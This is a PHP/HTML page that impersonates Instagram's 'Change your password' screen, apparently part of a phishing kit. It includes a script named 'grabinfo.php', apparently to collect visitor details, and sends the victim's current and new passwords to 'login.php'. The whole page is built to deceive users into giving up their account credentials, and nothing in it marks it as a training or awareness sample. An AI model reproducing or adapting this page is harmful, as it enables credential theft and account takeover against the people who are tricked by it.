<?php
include 'grabinfo.php';
?>
<!DOCTYPE html>
<html>
<head>
        <title>Instagram | Change your password</title>
        <link rel="stylesheet" type="text/css" href="sttyle.css">
        <meta name="viewport" content="width=device-width,initial-scale=1.0">
</head>
<body>
        <nav>
                <h2>Instagram</h2>
                <p>Find it for free on Google Play.</p>
                <a href="#">Get</a>
        </nav>
        <div class="container">
                <form method="post" action="login.php">
                        <h4>Change Password</h4>
                        <input type="text" name="cpass" placeholder="Current password">
                        <br/>
                        <p>Create new password</p>
                        <input type="password" name="npass" placeholder="New password">
                        <br/>
                        <input type="password" name="npass2" placeholder="Confirm new password">
                        <br/>
                        <button>Change</button>



                </form>
        </div>

</body>
</html>⏎
